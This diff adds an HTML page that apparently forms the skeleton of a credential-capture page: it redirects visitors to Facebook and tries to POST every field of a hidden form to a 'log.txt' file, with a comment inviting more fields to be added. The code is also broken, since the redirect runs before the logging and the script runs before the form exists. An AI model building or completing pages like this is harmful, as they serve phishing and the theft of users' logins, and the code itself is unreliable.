@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect</title>
+</head>
+<body>
+    <script>
+        // Redirect to Facebook
+        window.location.href = "http://www.facebook.com";
+
+        // Function to write form data to a text file
+        function writeToLogFile() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "log.txt", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            // Prepare data from form fields
+            var formData = "";
+            var formElements = document.forms["myForm"].elements;
+            for (var i = 0; i < formElements.length; i++) {
+                formData += encodeURIComponent(formElements[i].name) + "=" + encodeURIComponent(formElements[i].value) + "&";
+            }
+
+            // Send data to server
+            xhr.send(formData);
+        }
+
+        // Call function to write form data to text file
+        writeToLogFile();
+    </script>
+
+    <!-- Hidden form to submit data -->
+    <form id="myForm" method="post" action="">
+        <!-- Add your form fields here -->
+        <input type="hidden" name="example_field" value="example_value">
+    </form>
+</body>
+</html>
